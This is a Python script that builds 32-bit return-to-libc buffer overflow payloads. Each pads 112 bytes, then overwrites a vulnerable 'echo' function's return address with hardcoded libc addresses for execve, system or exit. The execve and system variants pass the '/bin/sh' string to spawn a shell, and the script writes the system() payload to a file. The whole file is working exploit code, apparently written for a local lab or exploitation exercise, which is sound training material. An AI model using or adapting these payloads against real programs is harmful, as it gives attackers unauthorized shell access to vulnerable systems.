#!/usr/bin/env python3

from struct import pack

def execve():

    # Junk
    payload = b'\x41' * 112

    # 1. Overwrite echo's Return-Address with execve's address
    payload += pack('<I', 0xf7e9b5a0)           # execve's libc address from gdb

    # 2. What after execve?
    payload += pack('<I', 0xdeadbeef)           # Some dummy address

    # Arguments
    # 1. First one: Fortunate that libc has "/bin/sh" string in it
    payload += pack('<I', 0xf7f5a0af)           # "/bin/sh"'s libc address
    payload += pack('<I', 0)                    # NULL
    payload += pack('<I', 0)                    # NULL

    return payload

def system():
    # Junk
    payload = b'\x41' * 112

    """
    1. system's address: 0xf7ddc000 + 0x0003d2e0
    2. system's return-address: AAAA
    3. Argument: Address of "/bin/sh" - 0xf7f5a0af
    """

    # 1. Overwrite echo's Return-Address with system's address
    payload += pack('<I', 0xf7ddc000 + 0x0003d2e0)           # system's libc address from gdb

    # 2. What after system?
    payload += pack('<I', 0xdeadbeef)           # Some dummy address

    # Arguments
    # 1. Fortunate that libc has "/bin/sh" string in it
    payload += pack('<I', 0xf7f5a0af)           # "/bin/sh"'s libc address

    return payload

def exit():

    """
    1. libc-base-address: 0xf7ddc000 (from /proc/PID/maps r-x)
    2. exit-offset: 0x000304b0      (readelf -s libc.so | grep "exit")
    3. exit-virtual-address = 0xf7ddc000 + 0x000304b0
    """

    # Junk
    payload = b'\x41' * 112

    # 1. Overwrite echo's Return-Address with exit()'s address
    payload += pack('<I', 0xf7ddc000 + 0x000304b0)       # exit's libc address from gdb

    # 2. What after exit?
    payload += pack('<I', 0xdeadbeef)       # Some dummy address

    # 3. Argument
    payload += pack('<I', 1)                # exit(1)

    return payload

if __name__ == '__main__':
    
    payload = system()
    fo = open('payload.txt', 'wb')
    fo.write(payload)
    fo.close()
